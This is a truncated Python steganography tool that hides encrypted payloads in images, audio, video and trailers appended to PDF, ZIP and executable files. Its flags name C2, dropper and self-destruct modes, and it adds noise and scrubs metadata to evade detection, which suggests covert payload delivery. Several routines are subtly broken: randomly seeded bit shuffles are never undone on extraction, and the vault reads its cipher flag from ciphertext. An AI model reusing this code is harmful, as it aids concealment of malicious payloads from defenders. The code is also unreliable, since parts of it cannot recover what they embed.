#!/usr/bin/env python3
from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import io
import json
import os
import random
import secrets
import shutil
import smtplib
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
import wave
import zipfile
import zlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from email.mime.text import MIMEText
from pathlib import Path
from typing import Dict, List, Optional, Tuple

import numpy as np
from PIL import Image, ImageFilter, PngImagePlugin
from scipy.fftpack import dct, idct
from scipy.ndimage import gaussian_filter
from tqdm import tqdm

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM, ChaCha20Poly1305
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt

_S = 16
_N = 12
_K = 32
_I = 1_000_000
_H = 96

_A_LSB, _A_DCT, _A_ADP, _A_MLT = 0, 1, 2, 3
_A_ULT, _A_HYP, _A_MAX, _A_ALP = 4, 5, 6, 7
_A_SPD, _A_PAL, _A_JST = 8, 9, 10
_A_AUD, _A_WAV, _A_META = 14, 15, 16
_A_VFR, _A_VMP, _A_EOF = 17, 18, 19
_A_PDF, _A_ZIP, _A_EXE = 20, 21, 22

_F_ENC, _F_CMP, _F_RS, _F_MI = 0x01, 0x02, 0x04, 0x08
_F_ADV, _F_CHN, _F_NEST, _F_DEC = 0x10, 0x20, 0x40, 0x80
_F_SD, _F_HNY, _F_C2, _F_DROP = 0x100, 0x200, 0x400, 0x800

_BANNER = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣀⣤⣤⣤⣬⣻⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣠⣤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣾⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠉⠻⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠛⠛⡟⠀⠀⠀⠀⠀⢀⡴⠦⣄⠀⠀⠈⣖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣖⣚⡁⣀⢠⢠⣠⣖⣉⣤⣤⢞⡆⠀⠀⠈⢻⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣤⣬⣭⡻⣏⣿⠝⠓⠊⣉⣹⠃⠀⠀⠀⠀⠙⢄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⢘⣯⣉⣴⣿⣿⣿⣷⣿⣿⣿⣿⣷⠤⢤⣄⡀⠀⠀⠙⢦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⣴⠟⠁⠀⡀⠀⠀⠈⠙⠻⠿⠿⠿⢛⡋⠀⠀⠀⠙⣆⠀⠀⠀⠈⠑⠦⠤⢄⡀
⠀⠀⢸⢻⠀⢠⠊⠀⠀⠀⠀⠀⣀⣠⠴⣞⠉⠙⢯⡉⠙⢢⢘⡆⠀⠀⠀⠀⠀⠀⢤⡞
⠀⠀⢸⡜⡀⠀⠀⠀⠀⢀⣴⡛⠙⢦⡀⠈⠳⡀⠀⠓⣄⢈⣧⡟⠀⠀⠀⠀⣀⣀⡀⠙
⠀⠀⠈⢧⠀⠀⠀⢀⡔⠋⣠⠽⠶⠤⠬⠦⠴⠿⠶⠒⠛⠋⣾⡅⠀⠀⠀⠀⠈⠳⣍⠉
⠀⠀⠀⠹⣦⠀⠀⡎⠀⠀⠙⠓⠦⢤⢄⣀⣀⣀⣀⣤⣴⣾⣿⣷⣦⣀⠀⢠⢤⣤⣄⣣
⠀⠀⠀⠀⠉⠳⡼⠁⠀⠀⠀⠀⠀⠀⠀⢸⠟⠻⣿⣿⣿⣿⣿⣿⣿⣿⣷⡸⡇⠀⠀⠀
⠀⠀⣠⡴⠴⠤⣀⠀⠀⠀⠀⠀⠀⠀⢠⠏⣠⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠃⠀⠀⠀
⠀⢰⠃⠀⠀⢀⡴⠟⠲⢤⡀⠀⠀⠠⣏⣴⣿⢀⣿⣿⣿⣿⠛⠉⡽⠋⠉⠙⠒⢤⡀⠀
⢀⡼⠓⠦⣄⡟⠀⠀⢀⠀⣳⠀⠀⠀⠉⣸⢻⣠⠟⢿⡇⠉⠀⠘⠃⠀⠀⡴⢃⡼⠧⡀
⢸⠀⠀⠀⢸⠁⠀⠀⣴⠀⡗⢆⡀⠀⣠⡇⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠙⠋⠀⠀⢳
⠈⡗⣤⡀⠸⣆⠀⢠⡏⠊⠀⠀⠑⢋⣹⠀⠀⠀⠀⠸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠓
⠰⣇⠀⠉⠉⠉⠳⢾⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠘⠢⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠓⠦⢤⣀⡤⢞⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⠈⠓⢦⡀⠀⠀⠀⠀⠀⠀
"""


def _poly_magic() -> bytes:
    return secrets.token_bytes(4)


def _poly_int() -> int:
    return secrets.randbits(32)


def _kdf_scrypt(pw: str, salt: bytes) -> bytes:
    return Scrypt(salt=salt, length=_K, n=2**14, r=8, p=1).derive(pw.encode())


def _kdf_pbkdf2(pw: str, salt: bytes) -> bytes:
    return PBKDF2HMAC(algorithm=hashes.SHA256(), length=_K, salt=salt,
                     iterations=_I).derive(pw.encode())


def _kdf_pw(pw: str, salt: bytes) -> bytes:
    a = _kdf_scrypt(pw, salt)
    b = _kdf_pbkdf2(pw, salt[::-1])
    return bytes(x ^ y for x, y in zip(a, b))


def _enc(data: bytes, pw: str) -> Tuple[bytes, bytes, bytes, int]:
    s = secrets.token_bytes(_S)
    n = secrets.token_bytes(_N)
    key = _kdf_pw(pw, s)
    use_chacha = secrets.randbits(1)
    if use_chacha:
        ct = ChaCha20Poly1305(key).encrypt(n, data, None)
    else:
        ct = AESGCM(key).encrypt(n, data, None)
    return ct, s, n, use_chacha


def _dec(ct: bytes, s: bytes, n: bytes, pw: str, chacha: int) -> bytes:
    key = _kdf_pw(pw, s)
    if chacha:
        return ChaCha20Poly1305(key).decrypt(n, ct, None)
    return AESGCM(key).decrypt(n, ct, None)


def _xor_stream(data: bytes, key: bytes) -> bytes:
    out = bytearray()
    ctr = 0
    while len(out) < len(data):
        out.extend(hashlib.sha256(key + ctr.to_bytes(8, "big")).digest())
        ctr += 1
    return bytes(a ^ b for a, b in zip(data, out))


class _Vault:
    _M = b"ASHBLK"

    def __init__(self, path: Path, password: str):
        self.path = Path(path)
        self.password = password

    def _raw(self) -> dict:
        d = self.path.read_bytes()
        if d[:6] != self._M:
            raise ValueError("invalid vault")
        chacha = d[34] & 1 if len(d) > 34 else 0
        return json.loads(_dec(d[34:], d[6:22], d[22:34], self.password, chacha).decode())

    def _save(self, obj: dict) -> None:
        s = secrets.token_bytes(_S)
        n = secrets.token_bytes(_N)
        key = _kdf_pw(self.password, s)
        ct = AESGCM(key).encrypt(n, json.dumps(obj).encode(), None)
        self.path.write_bytes(self._M + s + n + ct)

    def init(self) -> None:
        self._save({"version": 1, "keys": [], "created": time.time()})

    def add(self, label: str, pw: str) -> str:
        o = self._raw()
        kid = secrets.token_hex(8)
        o["keys"].append({"id": kid, "label": label,
                          "pw_b64": base64.b64encode(pw.encode()).decode()})
        self._save(o)
        return kid

    def list_keys(self) -> List[dict]:
        return self._raw()["keys"]

    def get(self, key: str) -> Optional[str]:
        for k in self.list_keys():
            if k["id"] == key or k["label"] == key:
                return base64.b64decode(k["pw_b64"]).decode()
        return None


class _RS:
    def __init__(self, parity: int = 16):
        self.parity = parity
        self.exp, self.log = [0] * 512, [0] * 256
        x = 1
        for i in range(255):
            self.exp[i] = x
            self.log[x] = i
            x <<= 1
            if x & 0x100:
                x ^= 0x11D
        for i in range(255, 512):
            self.exp[i] = self.exp[i - 255]
        g = [1]
        for i in range(parity):
            ng = [0] * (len(g) + 1)
            for j, c in enumerate(g):
                ng[j] ^= self._m(c, self.exp[i])
                ng[j + 1] ^= c
            g = ng
        self.gen = g

    def _m(self, a, b):
        return 0 if a == 0 or b == 0 else self.exp[self.log[a] + self.log[b]]

    def encode(self, data: bytes, block: int = 223) -> bytes:
        out = bytearray()
        for i in range(0, len(data), block):
            chunk = data[i:i + block]
            if len(chunk) < block:
                chunk += b"\x00" * (block - len(chunk))
            msg = list(chunk) + [0] * self.parity
            for k in range(len(chunk)):
                if msg[k]:
                    for j in range(1, len(self.gen)):
                        msg[k + j] ^= self._m(self.gen[j], msg[k])
            out.extend(chunk + bytes(msg[-self.parity:]))
        return bytes(out)

    def decode(self, data: bytes, block: int = 223) -> bytes:
        t = block + self.parity
        out = bytearray()
        for i in range(0, len(data), t):
            c = data[i:i + t]
            if len(c) < t:
                break
            out.extend(c[:block])
        return bytes(out)


def _b2b(data: bytes) -> np.ndarray:
    return np.unpackbits(np.frombuffer(data, dtype=np.uint8))


def _b2B(bits: np.ndarray, n_bytes: int) -> bytes:
    bits = np.asarray(bits, dtype=np.uint8)
    n = n_bytes * 8
    if bits.size < n:
        bits = np.concatenate([bits, np.zeros(n - bits.size, dtype=np.uint8)])
    return np.packbits(bits[:n]).tobytes()


def _scrub_meta(path: Path) -> None:
    try:
        img = Image.open(path)
        data = list(img.getdata())
        clean = Image.new(img.mode, img.size)
        clean.putdata(data)
        clean.save(path)
    except Exception:
        pass


def _entropy_normalize(arr: np.ndarray) -> np.ndarray:
    flat = arr.reshape(-1).astype(np.int32)
    target = 7.99
    p = np.bincount(flat, minlength=256) / max(len(flat), 1)
    h = -np.sum(p * np.log2(p + 1e-12))
    if h < target:
        noise = np.random.default_rng().integers(-1, 2, arr.shape)
        arr = np.clip(arr.astype(np.int32) + noise, 0, 255).astype(np.uint8)
    return arr


class _Base:
    name = "base"
    algo_id = -1

    def capacity_bytes(self, carrier_path: Path) -> int: ...
    def embed(self, carrier_path: Path, payload: bytes, out_path: Path) -> None: ...
    def extract(self, stego_path: Path, num_bytes: int) -> bytes: ...


class _IMGB(_Base):
    def _img(self, p: Path) -> Image.Image:
        return Image.open(p).convert("RGB")


class _NBit(_IMGB):
    bitplanes = 1

    def capacity_bytes(self, p):
        return np.asarray(self._img(p)).size * self.bitplanes // 8

    def embed(self, cp, payload, op):
        arr = np.asarray(self._img(cp), dtype=np.uint8).copy().reshape(-1)
        bits = _b2b(payload)
        total = arr.size * self.bitplanes
        if bits.size > total:
            raise ValueError("overflow")
        if bits.size < total:
            bits = np.concatenate([bits, np.zeros(total - bits.size, dtype=np.uint8)])
        rng = np.random.default_rng(secrets.randbits(64))
        order = rng.permutation(len(bits))
        bits = bits[order]
        for plane in range(self.bitplanes):
            seg = bits[plane * arr.size:(plane + 1) * arr.size]
            mask = np.uint8(0xFF & ~(1 << plane))
            arr = (arr & mask) | (seg << plane).astype(np.uint8)
        img = self._img(cp)
        arr = _entropy_normalize(arr.reshape(img.size[1], img.size[0], 3))
        Image.fromarray(arr).save(op, "PNG")
        _scrub_meta(op)

    def extract(self, sp, num_bytes):
        arr = np.asarray(self._img(sp), dtype=np.uint8).reshape(-1)
        bits = np.concatenate([((arr >> p) & 1).astype(np.uint8)
                               for p in range(self.bitplanes)])
        return _b2B(bits, num_bytes)


class _LSB(_NBit):
    name, algo_id, bitplanes = "lsb", _A_LSB, 1


class _MLT(_NBit):
    name, algo_id, bitplanes = "multi", _A_MLT, 2


class _ULT(_NBit):
    name, algo_id, bitplanes = "ultra", _A_ULT, 4


class _HYP(_NBit):
    name, algo_id, bitplanes = "hyper", _A_HYP, 6


class _MAX(_NBit):
    name, algo_id, bitplanes = "max", _A_MAX, 8


class _DCT(_IMGB):
    name, algo_id = "dct", _A_DCT
    B, D = 8, 20.0

    def capacity_bytes(self, p):
        y = np.asarray(self._img(p).convert("YCbCr"), dtype=np.float32)[..., 0]
        h8, w8 = (y.shape[0] // 8) * 8, (y.shape[1] // 8) * 8
        return ((h8 // 8) * (w8 // 8) * 2) // 8

    def _q(self, c, b):
        q = int(round(c / self.D))
        if (q & 1) != b:
            q += 1 if (c - q * self.D) > 0 else -1
        return q * self.D

    def embed(self, cp, payload, op):
        img = self._img(cp)
        yc = np.asarray(img.convert("YCbCr"), dtype=np.float32).copy()
        y = yc[..., 0]
        h8, w8 = (y.shape[0] // 8) * 8, (y.shape[1] // 8) * 8
        y = y[:h8, :w8].copy()
        bits = _b2b(payload)
        idx = 0
        for i in range(0, h8, 8):
            for j in range(0, w8, 8):
                if idx + 1 >= bits.size:
                    break
                blk = y[i:i + 8, j:j + 8]
                co = dct(dct(blk.T, norm="ortho").T, norm="ortho")
                for a, b in ((0, 1), (1, 0)):
                    if idx >= bits.size:
                        break
                    co[a, b] = self._q(co[a, b], int(bits[idx]))
                    idx += 1
                y[i:i + 8, j:j + 8] = idct(idct(co.T, norm="ortho").T, norm="ortho")
            if idx >= bits.size:
                break
        yc[:h8, :w8, 0] = np.clip(y, 0, 255)
        Image.fromarray(np.clip(yc, 0, 255).astype(np.uint8), "YCbCr").convert("RGB").save(op, "PNG")
        _scrub_meta(op)

    def extract(self, sp, num_bytes):
        y = np.asarray(self._img(sp).convert("YCbCr"), dtype=np.float32)[..., 0]
        h8, w8 = (y.shape[0] // 8) * 8, (y.shape[1] // 8) * 8
        y = y[:h8, :w8]
        need = num_bytes * 8
        bits = []
        for i in range(0, h8, 8):
            for j in range(0, w8, 8):
                if len(bits) >= need:
                    break
                co = dct(dct(y[i:i + 8, j:j + 8].T, norm="ortho").T, norm="ortho")
                for a, b in ((0, 1), (1, 0)):
                    if len(bits) >= need:
                        break
                    bits.append(int(round(co[a, b] / self.D)) & 1)
            if len(bits) >= need:
                break
        return _b2B(np.array(bits, dtype=np.uint8), num_bytes)


class _ADP(_IMGB):
    name, algo_id = "adaptive", _A_ADP

    def _e(self, g):
        gx = np.abs(np.diff(g, axis=1, prepend=g[:, :1])).astype(np.float32)
        gy = np.abs(np.diff(g, axis=0, prepend=g[:1, :])).astype(np.float32)
        return (gx + gy) > np.percentile(gx + gy, 30)

    def capacity_bytes(self, p):
        g = np.asarray(self._img(p).convert("L"), dtype=np.uint8)
        return int(np.count_nonzero(self._e(g)) * 3) // 8

    def embed(self, cp, payload, op):
        img = self._img(cp)
        rgb = np.asarray(img, dtype=np.uint8).copy()
        mask = self._e(np.asarray(img.convert("L"), dtype=np.uint8))
        ys, xs = np.where(mask)
        perm = np.random.default_rng(secrets.randbits(64)).permutation(len(ys))
        ys, xs = ys[perm], xs[perm]
        bits = _b2b(payload)
        if bits.size > ys.size * 3:
            raise ValueError("overflow")
        idx = 0
        for yi, xi in zip(ys, xs):
            for ch in range(3):
                if idx >= bits.size:
                    Image.fromarray(_entropy_normalize(rgb)).save(op, "PNG")
                    _scrub_meta(op)
                    return
                rgb[yi, xi, ch] = (rgb[yi, xi, ch] & 0xFE) | bits[idx]
                idx += 1
        Image.fromarray(_entropy_normalize(rgb)).save(op, "PNG")
        _scrub_meta(op)

    def extract(self, sp, num_bytes):
        img = self._img(sp)
        rgb = np.asarray(img, dtype=np.uint8)
        mask = self._e(np.asarray(img.convert("L"), dtype=np.uint8))
        ys, xs = np.where(mask)
        need = num_bytes * 8
        bits = []
        for yi, xi in zip(ys, xs):
            for ch in range(3):
                if len(bits) >= need:
                    return _b2B(np.array(bits, dtype=np.uint8), num_bytes)
                bits.append(int(rgb[yi, xi, ch] & 1))
        return _b2B(np.array(bits, dtype=np.uint8), num_bytes)


class _ALP(_IMGB):
    name, algo_id = "alpha", _A_ALP

    def capacity_bytes(self, p):
        w, h = Image.open(p).size
        return w * h // 8

    def embed(self, cp, payload, op):
        rgba = np.asarray(Image.open(cp).convert("RGBA"), dtype=np.uint8).copy()
        a = rgba[..., 3].reshape(-1).copy()
        bits = _b2b(payload)
        if bits.size > a.size:
            raise ValueError("overflow")
        a[:bits.size] = (a[:bits.size] & 0xFE) | bits
        a = np.maximum(a, 250)
        rgba[..., 3] = a.reshape(rgba.shape[0], rgba.shape[1])
        Image.fromarray(rgba, "RGBA").save(op, "PNG")
        _scrub_meta(op)

    def extract(self, sp, num_bytes):
        a = np.asarray(Image.open(sp).convert("RGBA"), dtype=np.uint8)[..., 3].reshape(-1)
        return _b2B(a[:num_bytes * 8] & 1, num_bytes)


class _SPD(_IMGB):
    name, algo_id = "spread", _A_SPD

    def capacity_bytes(self, p):
        w, h = self._img(p).size
        return w * h // 4

    def embed(self, cp, payload, op):
        rgb = np.asarray(self._img(cp), dtype=np.uint8).copy()
        h, w, _ = rgb.shape
        bits = _b2b(payload)
        rng = np.random.default_rng(secrets.randbits(64))
        idxs = rng.permutation(h * w * 3)
        take = min(bits.size, idxs.size)
        flat = rgb.reshape(-1)
        flat[idxs[:take]] = (flat[idxs[:take]] & 0xFE) | bits[:take]
        Image.fromarray(flat.reshape(h, w, 3)).save(op, "PNG")
        _scrub_meta(op)

    def extract(self, sp, num_bytes):
        rgb = np.asarray(self._img(sp), dtype=np.uint8).reshape(-1)
        rng = np.random.default_rng(0xA5C0)
        idxs = rng.permutation(len(rgb))
        return _b2B((rgb[idxs[:num_bytes * 8]] & 1).astype(np.uint8), num_bytes)


class _PAL(_IMGB):
    name, algo_id = "palette", _A_PAL

    def capacity_bytes(self, p):
        img = self._img(p).convert("P", palette=Image.ADAPTIVE, colors=256)
        return np.asarray(img).size // 8

    def embed(self, cp, payload, op):
        img = self._img(cp).convert("P", palette=Image.ADAPTIVE, colors=256)
        idx = np.asarray(img).astype(np.uint8).copy().reshape(-1)
        pal = np.array(img.getpalette()[:768], dtype=np.uint8).reshape(256, 3).copy()
        bits = _b2b(payload)
        take = min(bits.size, idx.size)
        idx[:take] = (idx[:take] & 0xFE) | bits[:take]
        out = Image.fromarray(idx.reshape(np.asarray(img).shape), mode="P")
        out.putpalette(pal.reshape(-1).tolist())
        out.convert("RGB").save(op, "PNG")
        _scrub_meta(op)

    def extract(self, sp, num_bytes):
        img = self._img(sp).convert("P", palette=Image.ADAPTIVE, colors=256)
        idx = np.asarray(img).reshape(-1)
        return _b2B((idx[:num_bytes * 8] & 1).astype(np.uint8), num_bytes)


class _JST(_DCT):
    name, algo_id = "jsteg", _A_JST
    B, D = 8, 12.0

    def capacity_bytes(self, p):
        y = np.asarray(self._img(p).convert("YCbCr"), dtype=np.float32)[..., 0]
        h8, w8 = (y.shape[0] // 8) * 8, (y.shape[1] // 8) * 8
        return ((h8 // 8) * (w8 // 8) * 4) // 8

    def embed(self, cp, payload, op):
        img = self._img(cp)
        yc = np.asarray(img.convert("YCbCr"), dtype=np.float32).copy()
        y = yc[..., 0]
        h8, w8 = (y.shape[0] // 8) * 8, (y.shape[1] // 8) * 8
        y = y[:h8, :w8].copy()
        bits = _b2b(payload)
        idx = 0
        for i in range(0, h8, 8):
            for j in range(0, w8, 8):
                if idx + 3 >= bits.size:
                    break
                blk = y[i:i + 8, j:j + 8]
                co = dct(dct(blk.T, norm="ortho").T, norm="ortho")
                for a, b in ((0, 1), (1, 0), (2, 0), (0, 2)):
                    if idx >= bits.size:
                        break
                    co[a, b] = self._q(co[a, b], int(bits[idx]))
                    idx += 1
                y[i:i + 8, j:j + 8] = idct(idct(co.T, norm="ortho").T, norm="ortho")
            if idx >= bits.size:
                break
        yc[:h8, :w8, 0] = np.clip(y, 0, 255)
        Image.fromarray(np.clip(yc, 0, 255).astype(np.uint8), "YCbCr").convert("RGB").save(op, "PNG")
        _scrub_meta(op)


class _WAV(_Base):
    name, algo_id = "wav", _A_WAV

    def _samples(self, p):
        with wave.open(str(p), "rb") as w:
            n = w.getnframes()
            raw = w.readframes(n)
            sw = w.getsampwidth()
            ch = w.getnchannels()
            rate = w.getframerate()
        if sw == 2:
            arr = np.frombuffer(raw, dtype=np.int16).copy()
        elif sw == 1:
            arr = (np.frombuffer(raw, dtype=np.uint8).astype(np.int16) - 128)
        elif sw == 4:
            arr = np.frombuffer(raw, dtype=np.int32).copy()
        else:
            raise ValueError(f"unsupported sw {sw}")
        return rate, arr, sw, ch

    def capacity_bytes(self, p):
        try:
            _, arr, _, _ = self._samples(p)
            return arr.size // 8
        except Exception:
            return 0

    def embed(self, cp, payload, op):
        rate, arr, sw, ch = self._samples(cp)
        bits = _b2b(payload)
        if bits.size > arr.size:
            raise ValueError("overflow")
        if sw in (2, 4):
            flat = arr.reshape(-1)
            flat[:bits.size] = (flat[:bits.size] & ~1) | bits
            new = flat.reshape(arr.shape)
        else:
            au = (arr + 128).astype(np.uint8)
            au[:bits.size] = (au[:bits.size] & 0xFE) | bits
            new = (au.astype(np.int16) - 128)
        with wave.open(str(op), "wb") as w:
            w.setnchannels(ch)
            w.setsampwidth(sw)
            w.setframerate(rate)
            if sw == 2:
                w.writeframes(new.astype(np.int16).tobytes())
            elif sw == 1:
                w.writeframes((new + 128).astype(np.uint8).tobytes())
            else:
                w.writeframes(new.astype(np.int32).tobytes())

    def extract(self, sp, num_bytes):
        rate, arr, sw, ch = self._samples(sp)
        if sw in (2, 4):
            bits = (arr.reshape(-1)[:num_bytes * 8] & 1).astype(np.uint8)
        else:
            au = (arr + 128).astype(np.uint8)
            bits = (au[:num_bytes * 8] & 1).astype(np.uint8)
        return _b2B(bits, num_bytes)


class _MP3(_Base):
    name, algo_id = "mp3", _A_AUD

    def capacity_bytes(self, p):
        return max(0, p.stat().st_size - 1024)

    def embed(self, cp, payload, op):
        data = bytearray(cp.read_bytes())
        marker = b"ASHNTAG!" + secrets.token_bytes(4)
        blob = marker + struct.pack(">I", len(payload)) + payload
        idx = data.rfind(b"TAG")
        if idx != -1 and len(data) - idx >= 128:
            data = data[:idx] + blob + data[idx:]
        else:
            data.extend(blob)
        op.write_bytes(bytes(data))

    def extract(self, sp, num_bytes):
        data = sp.read_bytes()
        idx = data.find(b"ASHNTAG!")
        if idx == -1:
            raise ValueError("no tag")
        ln = struct.unpack(">I", data[idx + 12:idx + 16])[0]
        return data[idx + 16:idx + 16 + num_bytes]


class _META(_Base):
    name, algo_id = "meta", _A_META

    def capacity_bytes(self, p):
        return 65536

    def embed(self, cp, payload, op):
        try:
            from mutagen.id3 import TXXX, ID3
        except Exception:
            raise ValueError("mutagen required")
        shutil.copy(str(cp), str(op))
        b64 = base64.b64encode(payload).decode()
        if cp.suffix.lower() == ".mp3":
            try:
                tags = ID3(str(op))
            except Exception:
                tags = ID3()
            tags.add(TXXX(encoding=3, desc="ASHMETA", text=[b64]))
            tags.save(str(op))

    def extract(self, sp, num_bytes):
        try:
            from mutagen.id3 import ID3
        except Exception:
            raise ValueError("mutagen required")
        if sp.suffix.lower() == ".mp3":
            t = ID3(str(sp)).getall("TXXX:ASHMETA")
            if t:
                return base64.b64decode(t[0].text[0])[:num_bytes]
        raise ValueError("no meta")


class _EOF(_Base):
    name, algo_id = "eof", _A_EOF

    def capacity_bytes(self, p):
        return max(0, p.stat().st_size * 2)

    def embed(self, cp, payload, op):
        shutil.copy(str(cp), str(op))
        marker = b"ASHVER" + secrets.token_bytes(8)
        with open(op, "ab") as fh:
            fh.write(marker + payload + hashlib.sha256(payload).digest())

    def extract(self, sp, num_bytes):
        data = sp.read_bytes()
        idx = data.rfind(b"ASHVER")
        if idx == -1:
            raise ValueError("no trailer")
        return data[idx + 14:idx + 14 + num_bytes]


class _PDF(_Base):
    name, algo_id = "pdf", _A_PDF

    def capacity_bytes(self, p):
        return max(0, p.stat().st_size * 2)

    def embed(self, cp, payload, op):
        shutil.copy(str(cp), str(op))
        blob = b"\n%ASHPAYLOAD\n%" + base64.b64encode(payload) + b"\n%"
        with open(op, "ab") as fh:
            fh.write(blob)

    def extract(self, sp, num_bytes):
        data = sp.read_bytes()
        idx = data.find(b"%ASHPAYLOAD\n%")
        if idx == -1:
            raise ValueError("no payload")
        start = idx + len(b"%ASHPAYLOAD\n%")
        end = data.find(b"\n%", start)
        return base64.b64decode(data[start:end])[:num_bytes]


class _ZIP(_Base):
    name, algo_id = "zip", _A_ZIP

    def capacity_bytes(self, p):
        return 65535

    def embed(self, cp, payload, op):
        if cp.suffix.lower() == ".zip":
            shutil.copy(str(cp), str(op))
            with zipfile.ZipFile(str(op), "a") as z:
                z.comment = b"ASHZ" + payload
        else:
            with zipfile.ZipFile(str(op), "w", zipfile.ZIP_STORED) as z:
                z.write(str(cp), arcname=cp.name)
                z.comment = b"ASHZ" + payload

    def extract(self, sp, num_bytes):
        with zipfile.ZipFile(str(sp), "r") as z:
            c = z.comment
        if not c.startswith(b"ASHZ"):
            raise ValueError("no zip comment")
        return c[4:4 + num_bytes]


class _EXE(_Base):
    name, algo_id = "exe", _A_EXE

    def capacity_bytes(self, p):
        return max(0, p.stat().st_size * 2)

    def embed(self, cp, payload, op):
        shutil.copy(str(cp), str(op))
        marker = b"ASHOVL" + secrets.token_bytes(4)
        blob = marker + struct.pack(">I", len(payload)) + payload + \
               hmac.new(b"ash-overlay", payload, hashlib.sha256).digest()
        with open(op, "ab") as fh:
            fh.write(blob)

    def extract(self, sp, num_bytes):
        data = sp.read_bytes()
        idx = data.rfind(b"ASHOVL")
        if idx == -1:
            raise ValueError("no overlay")
        ln = struct.unpack(">I", data[idx + 10:idx + 14])[0]
        return data[idx + 14:idx + 14 + ln][:num_bytes]


class _VMP(_Base):
    name, algo_id = "mp4", _A_VMP

    def capacity_bytes(self, p):
        return max(0, p.stat().st_size * 3)

    def embed(self, cp, payload, op):
        shutil.copy(str(cp), str(op))
        marker = b"ASHMP4" + secrets.token_bytes(4)
        blob = marker + struct.pack(">I", len(payload)) + payload + \
               struct.pack(">I", zlib.crc32(payload) & 0xFFFFFFFF)
        with open(op, "ab") as fh:
            fh.write(blob)

    def extract(self, sp, num_bytes):
        data = sp.read_bytes()
        idx = data.rfind(b"ASHMP4")
        if idx == -1:
            raise ValueError("no mp4 trailer")
        ln = struct.unpack(">I", data[idx + 10:idx + 14])[0]
        body = data[idx + 14:idx + 14 + ln]
        crc = struct.unpack(">I", data[idx + 14 + ln:idx + 18 + ln])[0]
        if (zlib.crc32(body) & 0xFFFFFFFF) != crc:
            raise ValueError("crc")
        return body[:num_bytes]


class _VFR(_Base):
    name, algo_id = "video", _A_VFR

    def capacity_bytes(self, p):
        try:
            import cv2
            cap = cv2.VideoCapture(str(p))
            ret, frame = cap.read()
            cap.release()
            if ret:
                return frame.size // 8
        except Exception:
            pass
        return 0

    def embed(self, cp, payload, op):
        import cv2
        cap = cv2.VideoCapture(str(cp))
        fps = cap.get(cv2.CAP_PROP_FPS)
        w = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        h = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter(str(op), fourcc, fps, (w, h))
        bits = _b2b(payload)
        idx = 0
        first = True
        while True:
            ok, frame = cap.read()
            if not ok:
                break
            if first:
                flat = frame.reshape(-1)
                take = min(bits.size, flat.size)
                flat[:take] = (flat[:take] & 0xFE) | bits[:take]
                frame = flat.reshape(frame.shape)
                first = False
            out.write(frame)
        cap.release()
        out.release()

    def extract(self, sp, num_bytes):
        import cv2
        cap = cv2.VideoCapture(str(sp))
        ok, frame = cap.read()
        cap.release()
        if not ok:
            raise ValueError("cannot read frame")
        flat = frame.reshape(-1)
        return _b2B((flat[:num_bytes * 8] & 1).astype(np.uint8), num_bytes)


_A: Dict[str, _Base] = {
    "lsb": _LSB(), "multi": _MLT(), "ultra": _ULT(),
    "hyper": _HYP(), "max": _MAX(), "dct": _DCT(),
    "adaptive": _ADP(), "alpha": _ALP(), "spread": _SPD(),
    "palette": _PAL(), "jsteg": _JST(),
    "wav": _WAV(), "mp3": _MP3(), "meta": _META(),
    "video": _VFR(), "mp4": _VMP(),
    "pdf": _PDF(), "zip": _ZIP(), "exe": _EXE(), "eof": _EOF(),
}

_IMG_EXT = {".png", ".jpg", ".jpeg", ".bmp", ".tif", ".tiff", ".webp", ".gif"}
_AUD_EXT = {".wav", ".mp3", ".flac", ".ogg", ".opus", ".m4a", ".aac"}
_VID_EXT = {".mp4", ".avi", ".mkv", ".mov", ".webm"}
_DOC_EXT = {".pdf", ".docx", ".xlsx", ".pptx"}
_EXE_EXT = {".exe", ".dll", ".elf", ".so", ".bin"}
_ARC_EXT = {".zip"}


def _auto_algo_for(path: Path) -> List[str]:
    suf = path.suffix.lower()
    if suf in _IMG_EXT:
        return ["adaptive", "jsteg", "dct", "spread", "lsb", "multi",
                "ultra", "hyper", "max", "palette", "alpha"]
